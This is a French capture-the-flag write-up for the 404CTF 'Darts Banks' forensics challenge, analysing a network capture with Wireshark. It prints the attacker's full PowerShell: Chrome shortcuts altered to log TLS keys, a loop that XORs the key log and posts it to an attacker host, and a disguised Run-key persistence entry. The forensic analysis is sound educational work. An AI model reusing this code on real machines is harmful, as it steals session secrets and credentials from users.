---
title: 404 CTF - Darts Banks
meta_title: ""
description: Write-up forensic inspection de paquets réseau
date: 2024-04-04T05:00:00Z
image: /images/404CTF_logo.png
categories:
  - 404CTF
  - moyen
author: Professeur_Jack
tags:
  - wireshark
  - forensic
  - réseau
draft: false
isSecret: false
---

Ce challenge du 404CTF a été un très bonne introduction sur l'utilisation de Wireshark pour détecter les anomalies dans les trames réseau.

## Le pitch :

*Un utilisateur s'est fait voler des secrets en se connectant à son site de fléchettes préféré, alors que sa connexion était sécurisée.
Il pense cependant qu'il s'est passé des choses étranges sur le réseau pendant son absence, et nous fournit un fichier pcapng pour essayer d'en savoir un peu plus...*

{{< button label="Télécharger la capture" link="/dart-banks/dart.pcapng" style="solid" >}}

## Première étape : inspection de la capture.
A l'inspection dans **Wireshark**, le premier élément qui nous saute aux yeux est celui-ci :
{{< image src="images/dart-banks/darts-1.png" caption="Quelqu'un a fait une mauvaise requête..." alt="wireshark capture" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}} 

La requête HTTP malformée nous indique une chose : quelqu'un essayé de se connecter manuellement à l'url d'une machine présente sur le même sous-réseau, la **192.168.78.89**.
Il a échoué une première fois avant de recommencer avec succès.
Qui plus est, depuis un terminal **Powershell** comme les entêtes nous en informent :
{{< image src="images/dart-banks/darts-2.png" caption="Voilà qui ne sent pas bon." alt="wireshark capture" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}} 

Cette requête récupère un ensemble de *segments tcp*  qui serviront à reconstituer ce qui semble être un script powershell encodé en *base64*. 
On a alors de bonnes raisons de penser qu'il s'agit là de notre point d'injection, et que quelqu'un a mis la main sur la machine de notre passionné de fléchettes pendant son absence...
{{< image src="images/dart-banks/darts-3.png" caption="Le début des ennuis" alt="wireshark capture" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}} 

Grâce à Wireshark, on peut facilement récupérer le script en entier en tant qu'objet HTTP, ainsi que les suivant s'il y en a.

`Fichier -> Exporter Objets -> HTTP`

{{< notice "tip" >}}
On peut aussi récupérer les objets en ligne de commande grâce à `tshark` :
```bash
`tshark -r dart.pcapng --export-objects http,export_dir`
```
{{< /notice >}}

Le plus gros de ces export, c'est notre notre script powershell encodé, récupéré avec le **GET** initial.
Mais on remarque une série d'objets venant de requêtes **POST** par la suite.

Il y a donc à parier que le script powershsell met en place un mécanisme d'exfiltration, vers la même machine depuis laquelle il a été téléchargé.
{{< image src="images/dart-banks/darts-4.png" caption="Le début des ennuis" alt="wireshark capture" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}} 

L'objet en notre possession, on peut commencer à l'analyser.

## Analyse du code powershell

```powershell
powershell -ep Bypass -EncodedCommand ZgBvAHIAZQBhAGMAaAAoACQAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAIABpAG4AIABHAGUAdAAtAEMAaABpAGwAZABJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAALQBQAGEAdABoACAAQwA6AFwAVQBzAGUAcgBzACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBJAG4AYwBsAHUAZABlACAAKgAuAGwAbgBrACkAewAkAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBPAE0AIABXAFMAYwByAGkAcAB0AC4AUwBoAGUAbABsADsAJABiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAD0AJABiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgAuAEMAcgBlAGEAdABlAFMAaABvAHIAdABjAHUAdAAoACQAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAKQA7AGkAZgAoACQAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgAuAFQAYQByAGcAZQB0AFAAYQB0AGgAIAAtAG0AYQB0AGMAaAAgACcAYwBoAHIAbwBtAGUAXAAuAGUAeABlACQAJwApAHsAJABiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAC4AQQByAGcAdQBtAGUAbgB0AHMAPQAiAC0ALQBzAHMAbAAtAGsAZQB5AC0AbABvAGcALQBmAGkAbABlAD0AJABlAG4AdgA6AFQARQBNAFAAXABkAGUAZgBlAG4AZABlAHIALQByAGUAcwAuAHQAeAB0ACIAOwAkAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIAYgBiAGIALgBTAGEAdgBlACgAKQA7AH0AfQAKAA==; $cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc="JGFhYWFhYWFhY /* Cette chaine de caractère en base64 est très loooooongue */ MgNTt9Cg==";powershell -ep Bypass -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAATQBhAHgAaQBtAGkAegBlAGQAIABoAHQAdABwAHMAOgAvAC8AaABlAGwAbABvAC4AcwBtAHkAbABlAHIALgBuAGUAdAA=;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc))>$env:TEMP\run.ps1;New-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run -Name ChromeUpdateChecker -Value "powershell -ep Bypass -File $env:TEMP\run.ps1" -PropertyType String -Force;powershell -ep Bypass -File $env:TEMP\run.ps1;
```

Commençons par décoder le premier bloc :
```powershell
foreach($bbbbbbbbbbbbinGet-ChildItem-Recurse-PathC:\Users-ErrorActionSilentlyContinue-Include*.lnk){$bbbbbbbbbbbbbbb=New-Object-COMWScript.Shell;$bbbbbbbbbbbbbbbb=$bbbbbbbbbbbbbbb.CreateShortcut($bbbbbbbbbbbb);if($bbbbbbbbbbbbbbbb.TargetPath-match'chrome\.exe$'){$bbbbbbbbbbbbbbbb.Arguments="--ssl-key-log-file=$env:TEMP\defender-res.txt";$bbbbbbbbbbbbbbbb.Save();}}
```


1. `foreach($bbbbbbbbbbbb in Get-ChildItem -Recurse -Path C:\Users -ErrorAction SilentlyContinue -Include *.Lnk)`: 
   Cette commande recherche de manière récursive tous les fichiers avec l'extension `.lnk` (raccourcis Windows) dans le dossier `"C:\Users"`, et ce, silencieusement (sans afficher les erreurs). Pour chaque fichier trouvé, il stocke le résultat dans la variable `$bbbbbbbbbbbb` et effectue les actions dans la boucle.
   
2. `$bbbbbbbbbbbbbb=New-Object -COM WScript.Shell`: 
   Ici, le script crée une nouvelle instance d'un objet COM basé sur `WScript.Shell`. Cet objet permet d'interagir avec des scripts de Windows.

3. `$bbbbbbbbbbbbbbbbb=$bbbbbbbbbbbbbb.CreateShortcut($bbbbbbbbbbbb)`: 
   Il utilise l'objet COM pour créer un objet raccourci pour le fichier spécifié dans la variable `$bbbbbbbbbbbb`.
   
4. `if($bbbbbbbbbbbbbbbbb.TargetPath -match 'chrome.exe')`: 
   Cette condition vérifie si le chemin cible de l'objet raccourci contient **'chrome.exe'**, ce qui indiquerait que le raccourci pointe vers l'exécutable de Google Chrome.

5. `$bbbbbbbbbbbbbbbbb.Arguments="--ssl-key-log-file=$env:TEMP\defender-res.txt"`: Si la condition est vraie, il modifie les arguments du raccourci pour ajouter un argument spécifique. Ici, il définit un fichier de log des clés SSL, qui serait stocké dans le répertoire TEMP sous le nom "defender-res.txt". 

6. `$bbbbbbbbbbbbbbbbb.Save()`: Enfin, il sauvegarde les modifications apportées à l'objet raccourci.

>Pour résumer, le script a substitué le raccourci du navigateur pour lui passer des options qui enregistreront les clés SSL dans un fichier TEMP\defender-res.txt ! 

Si un attaquant mettait la main sur ces clés, il pourrait déchiffrer à la volée le traffic http de la machine, cadenas vert ou non.
Il y a fort à parier, que c'est la nature du contenu des requêtes **POST**, mais leur contenu est chiffré. 
On doit poursuivre l'analyse du script pour trouver de nouveaux éléments.

La plus grosse partie du script, le contenu de la variable `$cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc` semble contenir une grosse clé de chiffrement sous forme de tableau de nombres.

```powershell
$aaaaaaaaaaaaa=0;$aaaaaaaaaaaaaa="$env:TEMP\defender-res.txt";$aaaaaaaaaaaa=[byte[]](
215,194,241,
... // Beaucoup de bytes
,93,120
);while($true){$aaaaaaaaaaaaaaa=Get-Item -Path $aaaaaaaaaaaaaa;$aaaaaaaaaaaaaaaa=$aaaaaaaaaaaaaaa.Length;if($aaaaaaaaaaaaaaaa -gt $aaaaaaaaaaaaa){$aaa=[System.IO.File]::Open($aaaaaaaaaaaaaa,[System.IO.FileMode]::Open, [System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite);$aaa.Seek($aaaaaaaaaaaaa,[System.IO.SeekOrigin]::Begin)|Out-Null;$aaaaaaaaaaaaaaaaaaa=New-Object byte[] ($aaaaaaaaaaaaaaaa - $aaaaaaaaaaaaa);$aaa.read($aaaaaaaaaaaaaaaaaaa,0,$aaaaaaaaaaaaaaaa - $aaaaaaaaaaaaa)|Out-Null;for($i=0;$i -lt $aaaaaaaaaaaaaaaaaaa.count;$i++){$aaaaaaaaaaaaaaaaaaa[$i]=$aaaaaaaaaaaaaaaaaaa[$i] -bxor $aaaaaaaaaaaa[$i % $aaaaaaaaaaaa.count];}$data=[Convert]::ToBase64String($aaaaaaaaaaaaaaaaaaa);Invoke-WebRequest -Uri http://192.168.78.89/index.html -Method POST -Body $data|Out-Null;$aaa.Close()|Out-Null;}$aaaaaaaaaaaaa=$aaaaaaaaaaaaaaaa;Start-Sleep -Seconds 5;}
```

Cemble être une routine PowerShell qui est conçue pour lire un fichier spécifique (ici notre fichier de log SSL), effectuer un chiffrement ou déchiffrement XOR avec une clé donnée (stockée dans `$aaaaaaaaaaaa`), puis envoyer les données résultantes à l'adresse malveillante.

```powershell
powershell -ep Bypass -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAATQBhAHgAaQBtAGkAegBlAGQAIABoAHQAdABwAHMAOgAvAC8AaABlAGwAbABvAC4AcwBtAHkAbABlAHIALgBuAGUAdAA=;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc))>$env:TEMP\run.ps1;New-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run -Name ChromeUpdateChecker -Value "powershell -ep Bypass -File $env:TEMP\run.ps1" -PropertyType String -Force;powershell -ep Bypass -File $env:TEMP\run.ps1;
```

Vient ensuite une nouvelle commande encodée, qui se traduit par `Start-Process -WindowStyle Maximized https://hello.smyler.net`.
C'est une petite blague des organisateurs, on peut passer à la suite =)

1. `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc))>$env:TEMP\run.ps1`: 
   Ceci semble déchiffrer le contenu de la variable `cccc`, puis redirige la sortie dans un fichier `run.ps1` dans le répertoire TEMP de l'utilisateur.

2. `New-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run -Name ChromeUpdateChecker -Value "powershell -ep Bypass -File $env:TEMP\run.ps1" -PropertyType String -Force`: 
   Cette commande crée une nouvelle entrée dans le registre Windows sous la clé `Run` qui permet au script `run.ps1` de s'exécuter à chaque démarrage de l'ordinateur. 

3. `powershell -ep Bypass -File $env:TEMP\run.ps1;`: 
   Enfin, cette commande exécute le script `run.ps1` qui vient d'être créé dans le répertoire TEMP.

On est donc sur de la *persistance* : il déchiffre le script encodé, le sauvegarde localement et crée une clé de registre pour s'assurer de son exécution à chaque démarrage du système.


## Reverse de la méthode de l'attaquant

Tous les morceaux sont en place.
Mais maintenant, il nous faut trouver le **flag**. Et pour cela, on devra se mettre à la place de l'attaquant qui a réussi à récupérer les identifiants du site de fléchettes. 
Nous savons que les clés exfiltrées se trouvent dans le contenu des requêtes POST, et nous avons tous les éléments pour les déchiffrer.

Nous allons nous faire un petit script python pour agréger les objets de requête, et utiliser la clé pour déchiffrer leur contenu.

```python
import base64

# La clé XOR sous forme d'un tableau de bytes (décodée en base 64 de la variable du script powershell)
key = bytes([215, .....])

# Définir le nom du fichier de sortie où les données déchiffrées seront enregistrées
output_filename = 'ssl_keys'

# Liste des fichiers à déchiffrer (exportés depuis wireshark)
files_to_decode = [
    'index(1).html',
    'index(2).html',
    'index(3).html',
    'index(4).html',
    'index(5).html',
    'index(6).html',
    'index(7).html',
    'index(8).html'
]

# Ouvrir le fichier de sortie pour écrire
with open(output_filename, 'wb') as output_file:
    # Boucler sur chaque fichier de la liste
    for filename in files_to_decode:
        # Lire le contenu encodé en base64 depuis le fichier
        with open(filename, 'r') as file:
            encoded_data = file.read()
        
        # Décoder les données base64
        encrypted_data = base64.b64decode(encoded_data)
        
        # Appliquer l'opération XOR pour déchiffrer les données. Si le contenu est plus grand que la clé, on refait un tour.
        decrypted_data = bytearray(len(encrypted_data))
        for i in range(len(encrypted_data)):
            decrypted_data[i] = encrypted_data[i] ^ key[i % len(key)]
        
        # Écrire les données déchiffrées dans le fichier de sortie
        output_file.write(decrypted_data)

        # Ajouter une nouvelle ligne pour séparer les contenus de chaque fichier, si nécessaire
        output_file.write(b'\n')
```

> Nous avons maintenant la liste des clés telles qu'elles ont été remontées au serveur du *bad guy* !

On peut la fournir à Wireshark pour qu'il déchiffre les paquets TLS :
`Edit > Preferences > Protocols > TLS`
Dans le champ `(Pre)-Master-Secret log filename`, on lui passe le chemin vers notre fichier de clés.

**Les paquets http sont en clair maintenant !**

On peut filtrer pour n'avoir que les échanges avec le site qui nous intéresse `ip.addr == 162.19.109.162 `, puis un filtre additionnel en sélectionnant `Détails du paquet`, et `Chaine de caractères` pour faire une recherche par chaine de caractère dans tous les paquets filtrés (comme un pattern de flag `404CTF` :) )

